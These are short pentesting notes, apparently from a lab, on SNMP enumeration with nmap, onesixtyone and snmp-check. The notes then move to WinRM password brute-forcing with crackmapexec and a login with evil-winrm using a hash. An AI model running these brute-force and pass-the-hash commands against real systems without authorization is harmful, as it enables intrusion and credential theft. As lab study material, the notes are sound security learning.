**SNMP (Simple Network Management Protocol)** lets devices (like servers, routers, etc.) share info about themselves — like running processes, users, or system details. It's mainly used by admins to monitor systems.

`- `This will give you the username password or any hint for login`

# Commands 

### Enummeration (nmap)

```bash
# Scan UDP 161 with SNMP scripts
nmap -sU -p161 --script "snmp-*" <IP>

# Scan SNMP ports 161,162 with version and process/netstat scripts
nmap -n -vv -sV -sU -Pn -p161,162 --script=snmp-processes,snmp-netstat <IP>
```

### Enummeration
1. `onesixtyone` is a **tool that scans for SNMP access**.
It tries a list of **common SNMP "passwords" (called community strings)** to see if the device will respond.
```bash
onesixtyone 10.10.156.82 -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
```
2. if `onesixtyone` identified any device/string  then We can then run this with snmp-check to dump all available SNMP information.
```bash
snmp-check -c openview 10.10.140.97
```
3. Looking through the results if we find a non default username we can bruteforce it 

```
crackmapexec winrm 10.10.140.97 -u Jareth -p /usr/share/wordlists/rockyou.txt | grep '(Pwn3d!)'
```

4. if you found creds then connect
```bash
evil-winrm -u administrator -p aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a -i 10.10.140.97
```

### Connect
```bash
# Use found creds to login to Windows via WinRM
evil-winrm -i <IP> -u 'username' -p 'password'
```
